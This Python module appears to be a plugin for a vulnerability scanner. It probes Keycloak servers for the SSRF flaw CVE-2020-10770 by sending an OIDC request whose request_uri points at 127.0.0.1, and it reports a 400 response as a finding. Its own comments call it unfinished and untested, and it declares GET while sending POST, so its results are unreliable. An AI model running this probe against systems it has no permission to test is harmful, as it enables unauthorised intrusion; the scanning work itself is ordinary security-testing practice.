#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
还！！！没！！！写！！！好！！！ 还没加dnslog
网上没有漏洞环境, 还没测试POC准确性
    Keycloak扫描类: 
        Keycloak SSRF
            CVE-2020-10770
            强制目标服务器使用OIDC参数请求request_uri调用未经验证的URL
'''

from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests

class Keycloak():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Keycloak'
        self.md = md5(self.app_name)

        self.cve_2020_10770_payloads = [
            {
                'path': 'auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://127.0.0.1',
                'data': ''
            }
        ]

    def cve_2020_10770_scan(self, url):
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'SSRF'
        vul_info['vul_id'] = 'CVE-2020-10770'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])

        for payload in self.cve_2020_10770_payloads:    # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data,
                    proxies=self.proxies, 
                    verify=False
                )
                vul_info['status_code'] = str(res.status_code)
                logger.logging(vul_info)                        # * LOG
            except requests.ConnectTimeout:
                vul_info['status_code'] = 'Timeout'
                logger.logging(vul_info)
                return None
            except requests.ConnectionError:
                vul_info['status_code'] = 'Faild'
                logger.logging(vul_info)
                return None
            except:
                vul_info['status_code'] = 'Error'
                logger.logging(vul_info)
                return None                

            if res.status_code == 400:
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def addscan(self, url):
        return [
            thread(target=self.cve_2020_10770_scan, url=url)
        ]

keycloak = Keycloak()